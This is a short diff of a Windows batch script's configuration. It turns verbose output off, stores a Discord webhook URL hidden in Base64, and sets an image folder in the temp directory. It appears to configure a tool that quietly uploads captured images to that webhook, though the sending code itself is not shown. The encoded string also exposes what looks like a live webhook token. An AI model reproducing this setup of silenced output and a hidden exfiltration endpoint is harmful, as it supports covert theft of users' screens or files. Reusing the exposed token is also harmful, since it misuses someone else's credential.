@@ -2,7 +2,7 @@
 setlocal EnableExtensions
 
 :: ================= CONFIG =================
-set "VERBOSE=true"
+set "VERBOSE=false"
 :: Your Webhook (Base64 Encoded)
 set "W_B64=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTQ2ODQ3OTcwNzY3NjczNS9MU0NEeUtlMHh4d1Nyb0h5OEJISS1nUXA0TmE3dlowRWJIeFk5MGhxSlZJSmxBLW1ud0JqR0U0eGJ0UkYtWG1tRjhzbA=="
 set "IMG_DIR=%TEMP%"
